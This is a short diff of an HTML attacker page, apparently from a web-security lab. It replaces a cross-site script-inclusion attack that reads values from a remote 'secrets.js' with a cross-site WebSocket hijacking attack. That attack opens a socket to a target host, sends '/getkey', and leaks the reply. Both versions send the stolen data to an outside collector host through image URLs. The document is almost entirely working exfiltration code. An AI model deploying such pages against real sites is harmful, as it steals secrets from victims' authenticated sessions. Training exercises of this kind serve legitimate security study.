@@ -5,13 +5,13 @@
 </head>
 <body>
     <script>
-    function display(data) {
-        for (var key in data){
-            document.write("<img src='http://lab--work.herokuapp.com/?s="+data[key]+"'/>");
-        }
-    }
-    </script>
-    <script src="http://ptl-4a80bc4b-8c40a8ec.libcurl.so/secrets.js">
+    var uri   = "ws://ptl-667e9969-827a8291.libcurl.so/";
+    var ws       = new WebSocket(uri);
+    ws.onmessage = function(message) {
+        var data=JSON.parse(message.data);
+        document.write('<img src="http://lab--work.herokuapp.com/?data='+data.text+'" />');
+    };
+    ws.onopen= () => ws.send(JSON.stringify({  text : "/getkey"  }));
     </script>
 </body>
 </html>
